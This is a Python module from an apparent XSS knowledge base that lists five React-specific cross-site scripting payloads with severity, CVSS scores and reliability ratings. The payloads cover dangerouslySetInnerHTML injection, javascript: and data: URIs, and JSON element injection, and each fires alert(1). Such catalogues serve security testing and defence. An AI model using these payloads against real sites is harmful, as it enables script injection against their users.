#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

React Framework XSS Payloads
"""

from ..models import PayloadEntry


REACT_PAYLOADS = {
    "react_1": PayloadEntry(
        payload='{"__html":"<img src=x onerror=alert(1)>"}',
        contexts=["javascript", "json"],
        severity="critical",
        cvss_score=8.5,
        description="dangerouslySetInnerHTML injection",
        tags=["react", "dangerouslySetInnerHTML", "json"],
        reliability="high",
    ),
    "react_2": PayloadEntry(
        payload="javascript:alert(1)",
        contexts=["url", "href"],
        severity="high",
        cvss_score=7.5,
        description="React href javascript protocol (pre-16.9)",
        tags=["react", "href", "javascript-uri"],
        reliability="medium",
    ),
    "react_3": PayloadEntry(
        payload='{"type":"script","props":{"dangerouslySetInnerHTML":{"__html":"alert(1)"}}}',
        contexts=["json"],
        severity="critical",
        cvss_score=8.5,
        description="React element injection via JSON",
        tags=["react", "element-injection", "json"],
        reliability="medium",
    ),
    "react_4": PayloadEntry(
        payload="data:text/html,<script>alert(1)</script>",
        contexts=["url", "src"],
        severity="high",
        cvss_score=7.5,
        description="Data URI in React src prop",
        tags=["react", "data-uri", "src"],
        reliability="medium",
    ),
    "react_5": PayloadEntry(
        payload='{"$$typeof":Symbol.for("react.element"),"type":"script","props":{"children":"alert(1)"}}',
        contexts=["json"],
        severity="critical",
        cvss_score=9.0,
        description="React element Symbol bypass (research)",
        tags=["react", "symbol", "element"],
        reliability="low",
    ),
}

REACT_PAYLOADS_TOTAL = len(REACT_PAYLOADS)
